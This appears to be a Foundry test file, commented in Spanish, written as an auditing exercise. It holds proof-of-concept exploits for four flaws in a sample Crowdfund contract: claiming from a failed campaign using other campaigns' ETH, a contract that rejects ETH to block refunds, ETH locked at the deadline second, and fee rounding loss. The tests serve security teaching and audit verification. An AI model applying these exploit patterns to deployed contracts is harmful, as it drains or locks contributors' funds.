// SPDX-License-Identifier: MIT
pragma solidity 0.8.38;

import {Test} from "forge-std/Test.sol";
import {Crowdfund} from "../src/Crowdfund.sol";

// ¿Qué? Un aportante que es un contrato sin `receive`: cualquier envío de ETH hacia él revierte.
contract Rejecter {
    function contribute(Crowdfund crowdfund, uint256 id) external payable {
        crowdfund.contribute{value: msg.value}(id);
    }
}

// ¿Qué? Las pruebas de concepto (PoC) de los hallazgos de Crowdfund: cada test pasa porque el
//   fallo existe.
// ¿Para qué? Un hallazgo con PoC no se discute: quien lo lee ejecuta el test y lo ve. Cuando el
//   equipo corrija el contrato, cada PoC tiene que dejar de pasar.
contract PoCTest is Test {
    Crowdfund crowdfund;
    address platform = makeAddr("platform");
    address carol = makeAddr("carol"); // creadora honrada
    address mallory = makeAddr("mallory"); // creadora atacante
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    uint64 deadline;

    function setUp() public {
        crowdfund = new Crowdfund(platform);
        vm.deal(alice, 100 ether);
        vm.deal(bob, 100 ether);
        deadline = uint64(block.timestamp + 30 days);
    }

    // Modelo: una campaña llega a su meta y su creadora cobra.
    function test_ClaimAfterGoal() public {
        vm.prank(carol);
        uint256 id = crowdfund.create(10 ether, deadline);
        vm.prank(alice);
        crowdfund.contribute{value: 10 ether}(id);
        vm.warp(deadline);
        vm.prank(carol);
        crowdfund.claim(id);
        assertEq(carol.balance, 9.75 ether);
        assertEq(platform.balance, 0.25 ether);
    }

    // H-01: el creador de una campaña que no llegó a su meta cobra igual.
    function test_Paso1_PoC_ClaimWithoutReachingGoal() public {
        // PASO 1: con el ETH de la campaña de Carol en el contrato, Mallory cobra la suya, que se
        //   quedó en 2 de 10 ETH, y Alice ya no puede recuperar lo que aportó.
        // Borra la línea del revert y descomenta las líneas que empiezan con `//> `.
        revert("TODO: Paso 1");
        //> vm.prank(carol);
        //> uint256 honest = crowdfund.create(20 ether, deadline);
        //> vm.prank(mallory);
        //> uint256 failed = crowdfund.create(10 ether, deadline);
        //> vm.prank(bob);
        //> crowdfund.contribute{value: 20 ether}(honest);
        //> vm.prank(alice);
        //> crowdfund.contribute{value: 2 ether}(failed);
        //>
        //> vm.warp(deadline);
        //> vm.prank(mallory);
        //> crowdfund.claim(failed);
        //> assertEq(mallory.balance, 1.95 ether);
        //>
        //> vm.warp(deadline + 1);
        //> vm.expectRevert(Crowdfund.Closed.selector);
        //> crowdfund.refundAll(failed);
    }

    // H-02: un aportante que rechaza ETH bloquea las devoluciones de todos.
    function test_Paso2_PoC_RejectingContributorBlocksRefunds() public {
        // PASO 2: un contrato sin `receive` aporta 1 wei. La campaña no llega a su meta y
        //   `refundAll` revierte siempre: los 5 ETH de Alice se quedan dentro.
        // Borra la línea del revert y descomenta las líneas que empiezan con `//> `.
        revert("TODO: Paso 2");
        //> vm.prank(carol);
        //> uint256 id = crowdfund.create(10 ether, deadline);
        //> vm.prank(alice);
        //> crowdfund.contribute{value: 5 ether}(id);
        //> Rejecter rejecter = new Rejecter();
        //> vm.deal(mallory, 1);
        //> vm.prank(mallory);
        //> rejecter.contribute{value: 1}(crowdfund, id);
        //>
        //> vm.warp(deadline + 1);
        //> vm.expectRevert(Crowdfund.TransferFailed.selector);
        //> crowdfund.refundAll(id);
        //> assertEq(alice.balance, 95 ether);
        //> assertEq(address(crowdfund).balance, 5 ether + 1);
    }

    // H-03: en el segundo exacto del plazo se puede aportar después de cobrar.
    function test_Paso3_PoC_ContributionAfterClaimIsLocked() public {
        // PASO 3: en `block.timestamp == deadline`, Carol cobra y después Bob aporta. Bob no
        //   recupera su ETH por ningún camino.
        // Borra la línea del revert y descomenta las líneas que empiezan con `//> `.
        revert("TODO: Paso 3");
        //> vm.prank(carol);
        //> uint256 id = crowdfund.create(10 ether, deadline);
        //> vm.prank(alice);
        //> crowdfund.contribute{value: 10 ether}(id);
        //>
        //> vm.warp(deadline);
        //> vm.prank(carol);
        //> crowdfund.claim(id);
        //> vm.prank(bob);
        //> crowdfund.contribute{value: 1 ether}(id);
        //>
        //> vm.prank(carol);
        //> vm.expectRevert(Crowdfund.Closed.selector);
        //> crowdfund.claim(id);
        //> vm.warp(deadline + 1);
        //> vm.expectRevert(Crowdfund.GoalReached.selector);
        //> crowdfund.refundAll(id);
        //> assertEq(address(crowdfund).balance, 1 ether);
    }

    // H-04: la comisión divide antes de multiplicar y redondea a la baja.
    function test_Paso4_PoC_FeeRoundsDown() public {
        // PASO 4: con 1 ETH y 9999 wei recaudados, la plataforma debería cobrar el 2,5 %,
        //   25000000000000249 wei, y cobra 249 wei menos.
        // Borra la línea del revert y descomenta las líneas que empiezan con `//> `.
        revert("TODO: Paso 4");
        //> uint256 raised = 1 ether + 9_999;
        //> vm.prank(carol);
        //> uint256 id = crowdfund.create(raised, deadline);
        //> vm.prank(alice);
        //> crowdfund.contribute{value: raised}(id);
        //> vm.warp(deadline);
        //> vm.prank(carol);
        //> crowdfund.claim(id);
        //>
        //> uint256 expected = raised * crowdfund.FEE_BPS() / 10_000;
        //> assertEq(expected, 25_000_000_000_000_249);
        //> assertEq(expected - platform.balance, 249);
    }
}
